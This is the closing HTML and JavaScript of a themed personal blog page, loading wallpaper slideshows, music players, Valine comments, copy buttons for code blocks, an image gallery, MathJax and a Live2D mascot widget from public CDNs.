        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/35F12181-F0E9-45BD-B134-37E4B4A660CF.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/AEB33F9D-7294-4CF1-B8C5-3020748A9D45.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/10A0FCE5-36A1-4AD0-8CF0-019259A89E03.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/298468D7-E388-44A8-8CC5-8213BDC33CED.jpeg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
        if ('') {
          $('').backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        } else {
          $.backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        }
      });
    </script>
  



  
    
<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>

  
    
<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js"></script>

  









  
    
<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>

  
  <script>
  var GUEST_INFO = ['nick','mail','link'];
  var meta = 'nick,mail,link'.split(',').filter(function(item){
    return GUEST_INFO.indexOf(item) > -1
  });
  var REQUIRED_FIELDS = ['nick','mail','link'];
  var requiredFields = 'nick,mail'.split(',').filter(function(item){
    return REQUIRED_FIELDS.indexOf(item) > -1
  });
  var valine = new Valine();
  function emoji(path, idx, ext) {
      return path + "/" + path + "-" + idx + "." + ext;
  }
  var emojiMaps = {};
  for (var i = 1; i <= 54; i++) {
    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
  }
  for (var i = 1; i <= 101; i++) {
    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
  }
  for (var i = 1; i <= 116; i++) {
    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
  }
  for (var i = 1; i <= 125; i++) {
    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
  }
  for (var i = 1; i <= 4; i++) {
    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
  }
  valine.init({
    el: '#valine_container',
    meta: meta,
    
    appId: "dogUA2FSKGTo029M1SEwGROT-MdYXbMMI",
    appKey: "u0NdtQ8nvHoMdJPSYqm1LRxE",
    placeholder: "快来评论吧~",
    pageSize:'10',
    avatar:'robohash',
    lang:'zh-cn',
    visitor: 'true',
    highlight: 'true',
    mathJax: 'true',
    enableQQ: 'true',
    requiredFields: requiredFields,
    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
    emojiMaps: emojiMaps
  })
  </script>





  
<script src="/js/app.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>






<!-- 复制 -->

  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-check-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-check-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-times-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-times-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>




<!-- fancybox -->

  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("div.fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* 图片采用懒加载处理时,
       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
       * 那么此处将原本的属性名src替换为对应属性名data-original,
       * 修改如下
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>






  <script>setLoadingBarProgress(100);</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="/node_modules/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"node_modules/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/node_modules/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
</html>
